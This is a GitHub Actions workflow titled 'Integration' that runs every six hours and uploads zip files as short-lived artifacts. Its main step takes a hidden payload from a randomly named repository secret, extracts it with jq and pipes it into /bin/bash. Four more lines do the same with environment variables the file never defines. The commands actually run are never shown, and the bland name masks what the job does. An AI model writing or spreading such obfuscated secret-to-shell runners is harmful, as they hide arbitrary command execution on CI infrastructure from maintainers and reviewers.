name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '35 0,6,12,18 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    name: Run task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Start
        env:
          llho3842: ${{ secrets.llho3842 }}
        run: |
          printf '%s' "$llho3842" | jq -r .haysy91 | /bin/bash
          echo $bmotf0 | jq -r .i0 | /bin/bash
          printf '%s' "$c253" | jq -r .fjq71 | /bin/bash
          printf '%s' "$chtu80" | jq -r .mt46 | /bin/bash
          echo $mztg966 | jq -r .u2 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ad2qYSX4
          path: "*.zip"
          retention-days: 1
